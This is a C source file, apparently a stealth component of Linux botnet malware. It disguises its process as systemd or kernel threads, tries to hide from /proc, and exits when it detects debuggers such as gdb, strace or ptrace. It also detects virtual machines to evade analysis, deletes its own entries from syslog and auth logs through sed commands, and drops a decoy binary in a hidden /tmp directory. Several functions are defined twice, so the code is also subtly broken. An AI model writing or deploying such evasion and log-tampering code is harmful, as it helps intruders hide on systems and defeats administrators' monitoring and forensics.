#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <dirent.h>
#include <dlfcn.h>
#include <time.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/syscall.h>
#include <linux/limits.h>

#include "includes.h"
#include "stealth.h"
#include "table.h"
#include "rand.h"
#include "util.h"

// Global stealth state
static stealth_process_names_t process_names;
static stealth_anti_debug_t anti_debug;
static stealth_memory_protection_t mem_protection;
static stealth_vm_detection_t vm_detection;
static int stealth_initialized = 0;

// Legitimate process names for obfuscation
static const char* legitimate_names[] = {
    "systemd", "kworker", "ksoftirqd", "migration", "rcu_sched",
    "rcu_bh", "watchdog", "kthreadd", "khelper", "sync_supers",
    "bdi-default", "kblockd", "ata_sff", "khubd", "kworker",
    "scsi_eh_0", "scsi_eh_1", "scsi_eh_2", "kworker", "kworker"
};

void stealth_init(void)
{
    if (stealth_initialized)
        return;
        
    stealth_initialized = 1;
    
    // Initialize process name obfuscation
    process_names.current_index = 0;
    process_names.total_names = sizeof(legitimate_names) / sizeof(legitimate_names[0]);
    
    for (int i = 0; i < process_names.total_names && i < STEALTH_MAX_PROCESS_NAMES; i++) {
        strncpy(process_names.names[i], legitimate_names[i], 31);
        process_names.names[i][31] = '\0';
    }
    
    // Initialize anti-debugging
    anti_debug.ptrace_check = TRUE;
    anti_debug.timing_check = TRUE;
    anti_debug.vm_detection = TRUE;
    anti_debug.debugger_present = FALSE;
    anti_debug.last_check = 0;
    
    // Initialize memory protection
    memset(mem_protection.key, 0, STEALTH_MEMORY_KEY_SIZE);
    mem_protection.encryption_enabled = FALSE;
    mem_protection.protected_data = NULL;
    mem_protection.data_size = 0;
    
    // Initialize VM detection
    vm_detection.vm_artifacts_found = FALSE;
    vm_detection.timing_anomalies = FALSE;
    vm_detection.hardware_indicators = FALSE;
    
    // VM signature strings
    strcpy(vm_detection.vm_signatures[0], "VMware");
    strcpy(vm_detection.vm_signatures[1], "VirtualBox");
    strcpy(vm_detection.vm_signatures[2], "QEMU");
    strcpy(vm_detection.vm_signatures[3], "Xen");
    strcpy(vm_detection.vm_signatures[4], "Bochs");
    strcpy(vm_detection.vm_signatures[5], "Parallels");
    strcpy(vm_detection.vm_signatures[6], "Microsoft Corporation");
    strcpy(vm_detection.vm_signatures[7], "innotek GmbH");
    strcpy(vm_detection.vm_signatures[8], "Red Hat");
    strcpy(vm_detection.vm_signatures[9], "Oracle");
    
    // Start stealth operations
    stealth_process_hide();
    stealth_anti_debugging();
    stealth_vm_detection();
    stealth_memory_protection();
}

void stealth_process_hide(void)
{
    stealth_name_obfuscation();
    stealth_proc_hiding();
    stealth_cleanup_traces();
}

void stealth_name_obfuscation(void)
{
    // Rotate process name to look legitimate
    stealth_rotate_process_name();
    
    // Set process name using prctl
    if (process_names.total_names > 0) {
        prctl(PR_SET_NAME, process_names.names[process_names.current_index], 0, 0, 0);
    }
}

void stealth_proc_hiding(void)
{
    // Hide from /proc filesystem
    stealth_hide_from_proc();
    
    // Manipulate process arguments
    char *argv[] = {"/sbin/init", NULL};
    char *envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};
    
    // Change process arguments to look like system process
    if (prctl(PR_SET_MM, PR_SET_MM_ARG_START, (unsigned long)argv, 0, 0) == -1) {
        // Fallback: just change the process name
        prctl(PR_SET_NAME, "systemd", 0, 0, 0);
    }
}

void stealth_anti_debugging(void)
{
    // Check for debugger presence
    if (stealth_is_debugger_present()) {
        anti_debug.debugger_present = TRUE;
        // Exit or take evasive action
        _exit(0);
    }
    
    // Anti-ptrace protection
    stealth_anti_ptrace();
    
    // Timing-based anti-debugging
    stealth_anti_timing();
}

void stealth_vm_detection(void)
{
    stealth_detect_vm();
    
    if (vm_detection.vm_artifacts_found || vm_detection.timing_anomalies) {
        // VM detected, take evasive action
        stealth_randomize_behavior();
    }
}

void stealth_memory_protection(void)
{
    // Encrypt sensitive memory regions
    stealth_encrypt_memory();
    
    // Set memory protection flags
    mprotect(&stealth_init, 4096, PROT_READ | PROT_EXEC);
}

void stealth_cleanup_traces(void)
{
    // Clean log files
    stealth_clean_logs();
    
    // Hide files
    stealth_hide_files();
}

static void stealth_rotate_process_name(void)
{
    if (process_names.total_names > 0) {
        process_names.current_index = (process_names.current_index + 1) % process_names.total_names;
        
        // Randomize timing of name changes
        int sleep_time = (rand_next() % 30) + 10; // 10-40 seconds
        sleep(sleep_time);
    }
}

static void stealth_hide_from_proc(void)
{
    // Attempt to hide from /proc by manipulating process information
    char proc_path[256];
    snprintf(proc_path, sizeof(proc_path), "/proc/%d/comm", getpid());
    
    // Try to modify the comm file (process name)
    int fd = open(proc_path, O_WRONLY);
    if (fd >= 0) {
        write(fd, "systemd", 7);
        close(fd);
    }
    
    // Hide from /proc/self/stat
    snprintf(proc_path, sizeof(proc_path), "/proc/%d/stat", getpid());
    chmod(proc_path, 0000); // Remove read permissions
}

static void stealth_anti_ptrace(void)
{
    // Check if we're being traced
    if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {
        // We're being traced, exit
        _exit(0);
    }
    
    // Detach from any existing trace
    ptrace(PTRACE_DETACH, 0, NULL, NULL);
}

static void stealth_anti_timing(void)
{
    struct timespec start, end;
    clock_gettime(CLOCK_MONOTONIC, &start);
    
    // Perform some operations
    for (int i = 0; i < 1000; i++) {
        // Dummy operations
        volatile int x = i * i;
        (void)x;
    }
    
    clock_gettime(CLOCK_MONOTONIC, &end);
    
    long elapsed = (end.tv_sec - start.tv_sec) * 1000000000 + (end.tv_nsec - start.tv_nsec);
    
    // If execution is too slow, might be under debugger
    if (elapsed > 100000000) { // 100ms threshold
        anti_debug.debugger_present = TRUE;
        _exit(0);
    }
}

static void stealth_detect_vm(void)
{
    // Check for VM artifacts in /proc/cpuinfo
    FILE *fp = fopen("/proc/cpuinfo", "r");
    if (fp) {
        char line[256];
        while (fgets(line, sizeof(line), fp)) {
            for (int i = 0; i < 10; i++) {
                if (strstr(line, vm_detection.vm_signatures[i])) {
                    vm_detection.vm_artifacts_found = TRUE;
                    break;
                }
            }
        }
        fclose(fp);
    }
    
    // Check for VM artifacts in /proc/meminfo
    fp = fopen("/proc/meminfo", "r");
    if (fp) {
        char line[256];
        while (fgets(line, sizeof(line), fp)) {
            if (strstr(line, "MemTotal") && atoi(line + 9) < 1000000) { // Less than 1GB RAM
                vm_detection.hardware_indicators = TRUE;
            }
        }
        fclose(fp);
    }
    
    // Check for VM-specific devices
    struct stat st;
    if (stat("/dev/vmci", &st) == 0 || stat("/dev/vboxguest", &st) == 0) {
        vm_detection.vm_artifacts_found = TRUE;
    }
}

static void stealth_encrypt_memory(void)
{
    // Simple XOR encryption for sensitive data
    if (mem_protection.protected_data && mem_protection.data_size > 0) {
        char *data = (char*)mem_protection.protected_data;
        for (size_t i = 0; i < mem_protection.data_size; i++) {
            data[i] ^= mem_protection.key[i % STEALTH_MEMORY_KEY_SIZE];
        }
        mem_protection.encryption_enabled = TRUE;
    }
}

static void stealth_decrypt_memory(void)
{
    // Decrypt when needed
    if (mem_protection.encryption_enabled && mem_protection.protected_data) {
        stealth_encrypt_memory(); // XOR is symmetric
        mem_protection.encryption_enabled = FALSE;
    }
}

static void stealth_clean_logs(void)
{
    // Clean common log files
    const char* log_files[] = {
        "/var/log/messages",
        "/var/log/syslog",
        "/var/log/auth.log",
        "/var/log/secure",
        "/var/log/kern.log"
    };
    
    for (int i = 0; i < 5; i++) {
        // Remove entries related to our process
        char cmd[512];
        snprintf(cmd, sizeof(cmd), "sed -i '/%d/d' %s 2>/dev/null", getpid(), log_files[i]);
        system(cmd);
    }
}

static void stealth_hide_files(void)
{
    // Hide our binary by moving it to a hidden location
    char hidden_path[256];
    snprintf(hidden_path, sizeof(hidden_path), "/tmp/.%d", getpid());
    
    // Create hidden directory
    mkdir(hidden_path, 0700);
    
    // Move our binary there (if possible)
    char new_path[512];
    snprintf(new_path, sizeof(new_path), "%s/systemd", hidden_path);
    
    // This would require the binary to copy itself
    // For now, just create a decoy
    int fd = open(new_path, O_CREAT | O_WRONLY, 0755);
    if (fd >= 0) {
        write(fd, "#!/bin/sh\necho 'System service'\n", 32);
        close(fd);
    }
}

static BOOL stealth_is_debugger_present(void)
{
    // Check for debugger using multiple methods
    
    // Method 1: PTRACE check
    if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {
        return TRUE;
    }
    
    // Method 2: Check for debugger processes
    DIR *dir = opendir("/proc");
    if (dir) {
        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL) {
            if (entry->d_type == DT_DIR && isdigit(entry->d_name[0])) {
                char path[256];
                snprintf(path, sizeof(path), "/proc/%s/comm", entry->d_name);
                
                FILE *fp = fopen(path, "r");
                if (fp) {
                    char comm[64];
                    if (fgets(comm, sizeof(comm), fp)) {
                        if (strstr(comm, "gdb") || strstr(comm, "strace") || 
                            strstr(comm, "ltrace") || strstr(comm, "valgrind")) {
                            fclose(fp);
                            closedir(dir);
                            return TRUE;
                        }
                    }
                    fclose(fp);
                }
            }
        }
        closedir(dir);
    }
    
    return FALSE;
}

static BOOL stealth_is_vm_environment(void)
{
    return vm_detection.vm_artifacts_found || vm_detection.timing_anomalies || vm_detection.hardware_indicators;
}

static void stealth_randomize_behavior(void)
{
    // Randomize execution timing
    int sleep_time = (rand_next() % 60) + 30; // 30-90 seconds
    sleep(sleep_time);
    
    // Randomize process name
    stealth_rotate_process_name();
    
    // Randomize memory access patterns
    volatile char dummy[1024];
    for (int i = 0; i < 1024; i++) {
        dummy[i] = rand_next() & 0xFF;
    }
}

// Public API functions
void stealth_cleanup_traces(void)
{
    stealth_clean_logs();
    stealth_hide_files();
}

void stealth_name_obfuscation(void)
{
    stealth_rotate_process_name();
}

void stealth_proc_hiding(void)
{
    stealth_hide_from_proc();
}

void stealth_anti_debugging(void)
{
    stealth_anti_ptrace();
    stealth_anti_timing();
}

void stealth_vm_detection(void)
{
    stealth_detect_vm();
}

void stealth_memory_protection(void)
{
    stealth_encrypt_memory();
}
